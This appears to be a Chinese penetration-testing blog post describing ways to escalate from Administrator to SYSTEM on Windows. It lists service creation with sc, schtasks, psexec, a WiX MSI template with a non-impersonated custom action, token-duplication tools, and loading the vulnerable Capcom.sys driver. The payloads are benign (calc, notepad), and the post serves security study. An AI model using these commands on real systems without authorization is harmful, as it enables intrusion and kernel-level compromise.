---
layout: post
title: 渗透技巧——从Admin权限切换到System权限
---


## 0x00 前言
---

在渗透测试中，某些情况下需要用到system权限，例如操作注册表`HKEY_LOCAL_MACHINE\SAM\SAM`

恰巧最近看到了一篇文章介绍了几种获得system权限的方法，于是决定结合自己的经验对这方面的技巧做系统整理

当然，前提是已经获得系统的管理员权限

学习链接：

https://blog.xpnsec.com/becoming-system/

## 0x01 简介
---

本文将要介绍以下内容：

- 通过创建服务获得System权限的方法
- 利用MSIExec获得System权限的方法
- 利用token复制获得System权限的方法
- 利用Capcom.sys获得System权限的方法

## 0x02 通过创建服务获得System权限
---

### 1、通过sc命令实现

```
sc Create TestService1 binPath= "cmd /c start" type= own type= interact
sc start TestService1
```

该方法在XP系统可以使用

Win7下使用时控制台提示：

> 警告: 服务 TestService1 被配置为交互式服务，其支持正受到抨击。该服务可能无法正常起作用。

服务启动时弹框，需要点击查看消息才能执行代码，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-1.png)

Win8下控制台提示错误，无法使用该方法

### 2、通过计划任务

使用at命令：

`at 7:50 notepad.exe`

默认以system权限启动，适用于Win7

从Win8开始不再支持at命令

使用schtasks命令：

创建服务，以system权限启动：

`schtasks /Create /TN TestService2 /SC DAILY /ST 00:36 /TR notepad.exe /RU SYSTEM`

查看服务状态：

`schtasks /Query /TN TestService2`

删除服务：

`schtasks /Delete /TN TestService2 /F`

**注：**

使用schtasks创建服务后记得手动删除

schtasks命令支持Win7-Win10

### 3、利用psexec

使用psexec会创建PSEXESVC服务，产生日志Event 4697、Event 7045、Event 4624和Event 4652

以system权限启动：

`psexec.exe -accepteula -s -d notepad.exe`

默认情况下，system权限的进程不会在用户桌面显示，如果需要显示进程界面，可以加`/i`参数，命令如下：

`psexec.exe -accepteula -s -i -d notepad.exe`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-2.png)

### 4、Meterpreter

参考Meterpreter的方法：

- 创建system权限的服务，提供一个命名管道
- 创建进程，连接到该命名管道

可供参考的代码：

https://github.com/xpn/getsystem-offline

需要getsystem-offline.exe和getsystem_service.exe

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-3.png)

**注：**

vs2012直接编译存在bug，可将函数`snprintf`替换为`_snprintf`


## 0x03 利用MSIExec获得System权限
---

我曾在之前的文章[《渗透测试中的msiexec》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/)介绍过利用Advanced Installer制作msi文件的方法，这里不再赘述

本节对XPN提到的方法做复现，使用wix3制作msi文件

wix3下载地址：

https://github.com/wixtoolset/wix3

msigen.wix的代码可参考如下地址：

https://gist.github.com/xpn/d1ef20dfd266053227d3e992ae84c64e

编译命令如下：

```
candle.exe msigen.wix
torch.exe msigen.wixobj
```

我对XPN的代码做了修改，将payload替换为执行calc.exe，细节上做了部分修改，代码如下：

```
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product 
Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
    <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
    <Media Id="1" />

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLLOCATION" Name="Example">
          <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">     
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <Feature Id="DefaultFeature" Level="1">
      <ComponentRef Id="ApplicationFiles"/>
    </Feature>

    <Property Id="cmdline">calc.exe
    </Property>

    <CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" 
ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>

    <CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
      invalid vbs to fail install
    </CustomAction>

    <InstallExecuteSequence>
      <Custom Action="SystemShell" After="InstallInitialize"></Custom>
      <Custom Action="FailInstall" Before="InstallFiles"></Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>

```

经过我的测试，使用torch.exe将msigen.wixobj编译成msigen.msi文件会报错，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-4.png)

使用light.exe能够成功生成msigen.msi，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-22/2-5.png)

虽然报错，但不影响文件的生成和功能的执行

也就是说，完整编译命令如下：

```
candle.exe msigen.wix
light.exe msigen.wixobj
```

直接双击执行msigen.msi会弹框，启动的calc.exe为system权限

命令行下执行：

`msiexec /q /i msigen.msi`

启动的calc.exe为high权限


## 0x04 利用token复制获得System权限
---

可参考之前的文章：[《渗透技巧——Token窃取与利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/)

通过复制system权限的token，使进程获得system权限，常用工具如下：

### 1、incognito

`incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe`

下载地址：

https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip

### 2、Invoke-TokenManipulation.ps1

`Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"`

下载地址：

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1

### 3、SelectMyParent

`SelectMyParent.exe cmd.exe 504`

参考地址：

https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp

Author： Didier Stevens

**注：**

SelectMyParent的原理同xpn开源的代码(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS method)相同，地址如下：

https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6

## 0x05 利用Capcom.sys获得System权限的方法
---

Capcom.sys是游戏公司Capcom的《街头霸王5》中用来反作弊的驱动程序，带有Capcom公司的签名，存在漏洞可以执行内核代码

下载地址：

https://github.com/3gstudent/test/blob/master/Capcom.sys

SHA1: `c1d5cf8c43e7679b782630e93f5e6420ca1749a7`

适用于Win7x64

1、在当前系统创建服务

需要管理员权限

```
sc create Capcom type= kernel binPath= C:\test\Capcom.sys
sc start Capcom
```
2、执行漏洞利用程序

普通用户权限即可

可供参考的的代码：

https://github.com/tandasat/ExploitCapcom


## 0x06 小结 
---

本文对常用的System权限获取方法做了整理，最后感谢xpn的博客和他的开源代码。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




